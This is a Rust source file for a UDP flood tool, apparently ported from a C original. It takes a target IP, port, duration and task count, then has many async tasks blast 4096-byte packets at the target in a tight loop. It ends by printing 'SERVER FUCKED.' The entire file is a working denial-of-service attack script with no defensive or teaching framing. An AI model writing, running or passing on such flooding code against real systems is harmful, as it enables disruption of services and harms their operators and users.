use tokio::net::UdpSocket;
use tokio::task;
use std::sync::Arc;
use std::env;
use std::time::{Instant, Duration};

const PACKET_SIZE: usize = 4096;  // Size of the packets sent

struct ThreadData {
    ip: Arc<String>,
    port: u16,
    duration: u64,
}

// Equivalent to `send_powerful_traffic` but in Rust with async
async fn send_powerful_traffic(data: Arc<ThreadData>) {
    let socket = UdpSocket::bind("0.0.0.0:0").await.expect("Socket creation failed");

    let server_addr = format!("{}:{}", data.ip, data.port);
    let packet = vec![b'A'; PACKET_SIZE]; // Fill the packet with 'A'
    let start_time = Instant::now();

    while start_time.elapsed().as_secs() < data.duration {
        if let Err(e) = socket.send_to(&packet, &server_addr).await {
            eprintln!("Failed to send packet: {}", e);
        } else {
            println!("Sent powerful packet to {}:{}", data.ip, data.port);
        }
    }
}

// Equivalent to `main()` in C, but using Rust and async
#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 5 {
        eprintln!("Usage: {} <IP> <Port> <Time> <Threads>", args[0]);
        return;
    }

    let ip = Arc::new(args[1].clone());
    let port: u16 = args[2].parse().expect("Invalid port number");
    let duration: u64 = args[3].parse().expect("Invalid duration");
    let thread_count: usize = args[4].parse().expect("Invalid thread count");

    let thread_data = Arc::new(ThreadData { ip, port, duration });

    let mut tasks = Vec::new();

    // Spawn user-specified number of async tasks (equivalent to pthreads)
    for _ in 0..thread_count {
        let data_clone = Arc::clone(&thread_data);
        tasks.push(task::spawn(send_powerful_traffic(data_clone)));
    }

    // Wait for all tasks to complete
    for t in tasks {
        t.await.expect("Task failed");
    }

    println!("SERVER FUCKED.");
}
